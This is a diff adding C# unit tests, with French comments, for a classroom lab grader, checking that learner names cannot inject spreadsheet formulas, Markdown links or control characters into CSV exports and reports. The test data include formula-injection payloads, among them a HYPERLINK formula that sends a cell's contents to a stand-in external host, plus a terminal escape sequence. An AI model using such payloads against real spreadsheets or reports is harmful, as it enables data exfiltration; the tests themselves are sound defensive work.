@@ -153,6 +153,33 @@ public class LabSubmissionTests
         Assert.StartsWith("Learner,File,", en[0]);
     }
 
+    [Theory]
+    [InlineData("=HYPERLINK(\"https://x.example/?\"&B2;\"Voir\")")]
+    [InlineData("+1+1")]
+    [InlineData("@SUM(A1)")]
+    public void TrappedNames_AreNeitherFormulasNorLinksNorExtraLines(string name)
+    {
+        var lab = Hygiene();
+        var rows = SubmissionGrader.GradeAll(lab, [Submit(lab, name)], "fr-FR");
+
+        // CSV : Excel ne l'évalue pas
+        var cell = SubmissionGrader.Csv(lab, rows, "fr-FR").Split('\n')[1].TrimStart('"');
+        Assert.StartsWith("'", cell);
+        // Bilan Markdown : ni lien ni image
+        Assert.DoesNotContain("](", SubmissionGrader.ClassReport(lab, rows, "fr-FR"));
+    }
+
+    [Fact]
+    public void ControlCharactersInAName_StayOnOneLine()
+    {
+        var lab = Hygiene();
+        var rows = SubmissionGrader.GradeAll(lab, [Submit(lab, "Bob\r\nAlice 20/20\u001b[8m")], "fr-FR");
+
+        Assert.Equal("Bob  Alice 20/20 [8m", rows[0].Student);
+        Assert.DoesNotContain(rows[0].Student, char.IsControl);
+        Assert.Equal("\\!\\[x\\]\\(https://x.example/a.png\\)", SafeText.Markdown("![x](https://x.example/a.png)"));
+    }
+
     [Fact]
     public void ClassReport_SummarisesTheClass()
     {
@@ -192,6 +219,24 @@ public class LabSubmissionTests
         var unchanged = result.Objectives.Where(o => o.Objective.Check.Type == LabCheckType.NotModified).ToList();
         Assert.NotEmpty(unchanged);
         Assert.All(unchanged, o => Assert.True(o.Passed, o.Feedback));
+    }
+
+    [Fact]
+    public void ACopyWithTwoSiblingsOfTheSameName_IsGradedWithTheRestOfTheClass()
+    {
+        // NotModified compare le départ et le domaine de l'apprenant : deux frères de même DN ne l'arrêtent plus
+        var lab = _labs.BuiltInLabs().Single(l => l.Id == "04-cloisonnement");
+        var twin = Submit(lab, "Alex", d =>
+        {
+            var ou = Flatten(d).First(o => o.Type == ADObjectType.OrganizationalUnit);
+            Add(ou, new ADObject("Doublon", ADObjectType.User));
+            Add(ou, new ADObject("Doublon", ADObjectType.User));
+        });
+        var other = Submit(lab, "Camille");
+
+        var rows = SubmissionGrader.GradeAll(lab, [twin, other], "fr-FR");
+
+        Assert.All(rows, r => Assert.True(r.Graded));
     }
 
     // ─── Sceau et session ────────────────────────────────────────────────────
